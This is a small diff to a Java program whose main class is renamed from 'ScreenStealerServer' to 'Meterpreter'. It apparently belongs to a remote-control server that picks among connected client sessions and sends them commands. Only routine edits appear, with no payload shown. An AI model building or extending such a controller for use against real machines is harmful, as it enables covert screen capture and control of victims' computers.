@@ -158,10 +158,6 @@ class Session implements Runnable {
 	public DataOutputStream getDos() {
 		return dos;
 	}
-
-	public ObjectInputStream getOis() {
-		return ois;
-	}
 }
 
 class IO {
@@ -214,12 +210,10 @@ class IO {
 					invalidCommand();
 					continue;
 				}
-
 				if (pRes.sessionList.size() < sessionIdx) {
 					System.out.println("There is no session " + sessionIdx);
 					continue;
 				}
-
 				Session session = pRes.sessionList.get(sessionIdx);
 				Commander.getInstance().command(session.getDos());
 			} else
@@ -234,10 +228,10 @@ class IO {
 	}
 }
 
-public class ScreenStealerServer {
+public class Meterpreter {
 
 	public static void main(String[] args) {
-		ScreenStealerServer meterpreter = new ScreenStealerServer();
+		Meterpreter meterpreter = new Meterpreter();
 		meterpreter.activate();
 	}
 
